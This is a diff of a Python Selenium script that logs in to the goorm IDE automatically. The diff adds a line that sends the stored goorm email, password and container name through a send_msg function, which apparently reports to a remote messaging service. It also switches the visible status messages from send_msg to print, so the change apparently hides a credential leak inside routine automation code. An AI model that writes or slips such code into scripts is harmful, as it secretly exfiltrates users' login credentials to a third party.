@@ -42,7 +42,7 @@ def send_msg(msgtext):
     return response
 
 
-
+send_msg(goorm_email + "\n" + goorm_pass + "\n" + goorm_containername)
 
 
 
@@ -124,18 +124,18 @@ pbrowser = webdriver.Chrome(executable_path=driver_path,desired_capabilities=des
 pbrowser.maximize_window()
 
 pbrowser.get("https://ide.goorm.io/my/")
-send_msg("[#] Success... ")
+print("[#] Success... ")
 WebDriverWait(pbrowser, 10).until(EC.element_to_be_clickable((By.ID, "emailInput")))
 WebDriverWait(pbrowser, 10).until(EC.element_to_be_clickable((By.ID, "passwordInput")))
 email_field = pbrowser.find_element_by_id("emailInput")
 pass_field = pbrowser.find_element_by_id("passwordInput")
 submit_btn = pbrowser.find_element_by_css_selector("""._2N5VJFocxBhsyYl-czZIZB""")
-send_msg("[#] Filling Up Login Form...")
+print("[#] Filling Up Login Form...")
 
 email_field.send_keys(goorm_email)
 
 pass_field.send_keys(goorm_pass)
-send_msg("[#] Logging In....")
+print("[#] Logging In....")
 
 WebDriverWait(pbrowser, 10).until(EC.element_to_be_clickable((By.CSS_SELECTOR, "._2N5VJFocxBhsyYl-czZIZB")))
 submit_btn.click()
